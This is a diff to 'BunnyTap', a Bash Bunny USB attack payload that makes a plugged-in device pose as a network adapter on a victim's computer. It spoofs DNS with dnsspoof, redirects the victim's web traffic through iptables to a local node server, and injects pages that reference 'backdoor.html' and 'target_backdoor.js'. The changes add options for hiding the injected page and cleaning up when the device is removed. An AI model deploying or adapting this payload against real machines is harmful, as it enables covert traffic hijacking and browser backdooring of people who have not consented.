@@ -2,11 +2,36 @@
 #
 # Title:         BunnyTap
 # Author:        Whistle Master
-# Version:       1.0
+# Tweaker:       Gachnang
+# Version:       1.1
 
 # Enable Ethernet (RNDIS = Windows, ECM = mac/*nix)
 ATTACKMODE RNDIS_ETHERNET
 #ATTACKMODE ECM_ETHERNET
+
+# Changed the 'displayAnimation' in 'target_injected_xhtmljs.html'
+# 0 : disabled
+# 1 : enabled
+displayAnimation=1
+
+# Uses 'top-1m.csv' after urls in 'target_injected_xhtmljs.html' are finished
+# You can download the csv over 'alexa1m.sh' and have to unzip it here
+# 0 : disabled
+# 1 : enabled
+useTop1m=0
+
+# What to do when finished?
+# 0 : 	Nothing (BunnyTab page stays open, user can see what happend)
+# 1 : 	Clear page (Only '/* */' will be displayed on page 
+#		(like 'displayAnimation' is false in 'target_injected_xhtmljs.html'))
+# 2 : 	Redirect to 'about:blank' (Leave BunnyTab page 
+#		(Can close 'backdoor.html' or 'target_backdoor.js'))
+onFinished=2
+
+# When BashBunny is removed, 'onFinished' in about 10 seconds 
+# 0 : disabled
+# 1 : enabled
+finishOnBunnyAway=1
 
 ##################################################################
 #                  DO NOT EDIT BELOW THIS LINE                   #
@@ -16,6 +41,11 @@ ATTACKMODE RNDIS_ETHERNET
 function setupNetworking() {
     echo 1 > /proc/sys/net/ipv4/ip_forward
 	/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337
+}
+
+# Sets up config
+function setupConfig() {
+	echo { \"_comment\": \"This file gets overwritten by payload.txt\", \"onFinished\": $onFinished, \"finishOnBunnyAway\": $finishOnBunnyAway, \"displayAnimation\": $displayAnimation, \"useTop1m\": $useTop1m } > BunnyTap.json
 }
 
 # Find payload directory and execute payload
@@ -28,6 +58,7 @@ function startBunnyTap() {
 	fi
 	
 	cd $path
+	setupConfig
 	
 	/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
 	/usr/bin/screen -dmS node /usr/bin/nodejs ./bunnytap.js
